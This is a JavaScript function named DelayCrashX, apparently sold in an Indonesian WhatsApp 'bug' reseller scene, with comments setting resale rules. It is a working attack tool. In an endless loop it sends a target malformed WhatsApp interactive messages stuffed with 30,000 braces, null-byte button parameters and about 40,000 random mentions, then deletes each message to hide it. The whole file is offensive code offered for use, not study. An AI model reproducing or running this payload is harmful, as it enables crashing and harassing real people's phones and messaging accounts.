/* 
Function DekayCrash Create By @GyzenVtx 
Rules :
• Reseller Function No Jual Function
• Pt Function Bebas Jual Asal Harga Ga Mines
• No Share Function Ke Own/Tk/PT Lu
• No Sebar Function Secara Free
Melanggar? Gw Bl + Kick Lu Bangsat
*/

async function DelayCrashX(target) {
  while (true) {
    for (let i = 0; i < Math.floor(Math.random() * 3) + 3; i++) {
      const msg = await generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  hasMediaAttachment: false,
                  liveLocationMessage: {
                    degreesLatitude: -6666666,
                    degreesLongitude: 666.6666666,
                    name: "GyzenVtx",
                    address: "GyzenZxZ"
                  }
                },
                body: {
                  text: "( 👾 ) by GyzenZxZ"
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(30000),
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: "\u0000".repeat(999)
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "\u0000".repeat(999)
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "\u0000".repeat(999)
                    },
                    {
                      name: "payment_status",
                      buttonParamsJson: "\u0003"
                    },
                  ]
                },
                contextInfo: {
                  remoteJid: "status@broadcast",
                  participant: target,
                  forwardingScore: 999999,
                  isForwarded: false,
                  mentionedJid: [
                    "30000000@s.whatsapp.net",
                    "phynx@s.whatsapp.biz",
                    ...Array.from({ length: 400 * 100 }, () =>
                      "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                    )
                  ]
                },
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 1,
                    expiryTimestamp: null
                  }
                }
              }
            }
          }
        },
        {}
      );

      await sock.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });

      await sock.sendMessage(target, { delete: msg.key });

      console.log(`ＰＲＯＳＥＳ ＮＪＩＲ ${i + 1} => ${target}`);
    }
  }
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/* JIKA MELIHAT ORNG/PT SAYA YG MENYEBABKAN FUNCTION INI MOHON LAPORKAN SAYA ( @GyzenVtx ), Lu Bakal Gw Kasih 1 Function Privat Gw Jika Melaporkan Jika Patner Gw Ada Yg Nyebar Function Ini 
*/